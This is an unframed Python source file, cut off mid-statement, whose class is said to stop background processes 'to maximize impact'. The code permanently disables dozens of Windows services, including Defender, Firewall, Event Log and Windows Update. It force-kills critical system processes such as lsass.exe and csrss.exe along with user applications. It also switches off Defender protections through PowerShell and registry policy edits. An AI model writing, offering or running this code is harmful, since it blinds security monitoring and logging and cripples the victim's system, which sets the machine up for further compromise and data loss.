import os
import platform
import subprocess
import time

class SystemController:
    def __init__(self):
        self.platform = platform.system()
    
    def stop_background_processes(self):
        """Stop all background processes to maximize impact"""
        if self.platform == "Windows":
            try:
                # Stop critical Windows services
                services_to_stop = [
                    "Spooler",  # Print spooler
                    "Themes",   # Visual themes
                    "AudioSrv", # Windows Audio
                    "BITS",     # Background Intelligent Transfer Service
                    "wuauserv", # Windows Update
                    "EventLog", # Windows Event Log
                    "WinDefend",# Windows Defender
                    "SecurityHealthService",  # Windows Security Health Service
                    "SysMain",  # Superfetch/Prefetch
                    "DiagTrack",# Diagnostic Tracking Service
                    "wlidsvc",  # Windows Live ID Service
                    "OneSyncSvc",# Sync Host Service
                    "BFE",      # Base Filtering Engine
                    "MpsSvc",   # Windows Firewall
                    "TermService", # Terminal Services
                    "Schedule", # Task Scheduler
                    "Dnscache", # DNS Client
                    "LanmanServer", # Server service
                    "LanmanWorkstation", # Workstation service
                    "Browser",  # Computer Browser
                    "PlugPlay", # Plug and Play
                    "Power",     # Power management
                    "CryptSvc",  # Cryptographic Services
                    "Netlogon",  # Netlogon Service
                    "Netman",    # Network Connections
                    "NlaSvc",    # Network Location Awareness
                    "nsi",       # Network Store Interface Service
                    "RasMan",    # Remote Access Connection Manager
                    "SessionEnv",# Remote Desktop Configuration
                    "TermService", # Terminal Services
                    "Themes",    # Themes
                    "UmRdpService", # Remote Desktop Services UserMode Port Redirector
                    "Wcmsvc",    # Windows Connection Manager
                    "Winmgmt",   # Windows Management Instrumentation
                    "wscsvc",    # Windows Security Center
                    "WSearch",   # Windows Search
                    "MixedRealityExt", # Mixed Reality Extension Service
                    "XboxNetApiSrv", # Xbox Live Networking Service
                    "XboxGipSvc", # Xbox Accessory Management Service
                ]
                
                for service in services_to_stop:
                    try:
                        subprocess.run(f'sc stop "{service}"', shell=True, check=False, capture_output=True)
                        subprocess.run(f'sc config "{service}" start= disabled', shell=True, check=False, capture_output=True)
                    except:
                        pass
                
                # Kill common processes
                processes_to_kill = [
                    "explorer.exe",  # Windows shell
                    "winlogon.exe",  # Windows Logon
                    "csrss.exe",     # Client/Server Runtime Subsystem
                    "smss.exe",      # Session Manager Subsystem
                    "services.exe",  # Service Control Manager
                    "lsass.exe",     # Local Security Authority
                    "svchost.exe",   # Service Host
                    "spoolsv.exe",   # Print Spooler
                    "taskmgr.exe",   # Task Manager
                    "regedit.exe",   # Registry Editor
                    "msconfig.exe",  # System Configuration
                    "cmd.exe",       # Command Prompt
                    "powershell.exe",# PowerShell
                    "msmpeng.exe",   # Windows Defender
                    "SecurityHealthSystray.exe", # Windows Security tray
                    "msseces.exe",   # Microsoft Security Essentials
                    "MsMpEng.exe",   # Microsoft Antimalware Service
                    "SearchIndexer.exe", # Windows Search Indexer
                    "OneDrive.exe",  # OneDrive
                    "Discord.exe",   # Discord
                    "slack.exe",     # Slack
                    "Teams.exe",     # Microsoft Teams
                    "chrome.exe",    # Google Chrome
                    "firefox.exe",   # Mozilla Firefox
                    "iexplore.exe",  # Internet Explorer
                    "msedge.exe",    # Microsoft Edge
                    "notepad.exe",   # Notepad
                    "winword.exe",   # Microsoft Word
                    "excel.exe",     # Microsoft Excel
                    "powerpnt.exe",  # Microsoft PowerPoint
                    "outlook.exe",   # Microsoft Outlook
                    "code.exe",      # Visual Studio Code
                    "python.exe",    # Python
                    "java.exe",      # Java
                    "javaw.exe",     # Java (no console)
                    "node.exe",      # Node.js
                    "npm.exe",       # Node Package Manager
                    "steam.exe",     # Steam
                    "BattleNET.exe", # Battle.net
                    "Origin.exe",    # Origin
                    "EpicGamesLauncher.exe", # Epic Games Launcher
                    "Uplay.exe",     # Uplay
                    "gta5.exe",      # GTA V
                    "valorant.exe",  # Valorant
                    "League of Legends.exe", # League of Legends
                    "spotify.exe",   # Spotify
                    "vlc.exe",       # VLC Media Player
                    "wmplayer.exe",  # Windows Media Player
                    "quicktimeplayer.exe", # QuickTime Player
                    "iTunes.exe",    # iTunes
                ]
                
                for process in processes_to_kill:
                    try:
                        subprocess.run(f'taskkill /f /im "{process}"', shell=True, check=False, capture_output=True)
                    except:
                        pass
                
                # Disable Windows Security features
                try:
                    subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring \$true"', shell=True, check=False)
                    subprocess.run('powershell -Command "Set-MpPreference -DisableIOAVProtection \$true"', shell=True, check=False)
                    subprocess.run('powershell -Command "Set-MpPreference -DisableScriptScanning \$true"', shell=True, check=False)
                    subprocess.run('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring \$true"', shell=True, check=False)
                    subprocess.run('powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen \$true"', shell=True, check=False)
                    subprocess.run('powershell -Command "Set-MpPreference -DisableIOAVProtection \$true"', shell=True, check=False)
                    subprocess.run('powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem \$true"', shell=True, check=False)
                    subprocess.run('powershell -Command "Set-MpPreference -DisableScriptScanning \$true"', shell=True, check=False)
                    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True, check=False)
                    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f', shell=True, check=False)
                    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f', shell=True, check=False)
                    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f', shell=True, check=False)
                    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f', shell=True, check=False)
                    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f', shell=True, check=False)
                    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f', shell=True, check=False)
                    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v DisableIntrusionPreventionSystem /t REG_DWORD /d 1 /f', shell=True, check=False)
                    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v LocalSettingOverrideSpynetReporting /t REG_DWORD /d 1 /f', shell=True, check=False)
                    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v SpynetReporting /t REG_DWORD /d 0 /f', shell=True, check=False)
                    subprocess.run('net stop "WinDefend"', shell=True, check=False)
                    subprocess.run('net stop "SecurityHealthService"', shell=True, check=False)
                    subprocess.run('sc stop "WinDefend"', shell=True, check=False)
                    subprocess.run('sc stop "SecurityHealthService"', shell=True, check=False)
                    subprocess.run('sc config "WinDefend" start= disabled', shell=True, check=False)
                    subprocess.run('sc config "SecurityHealthService" start= disabled', shell=True
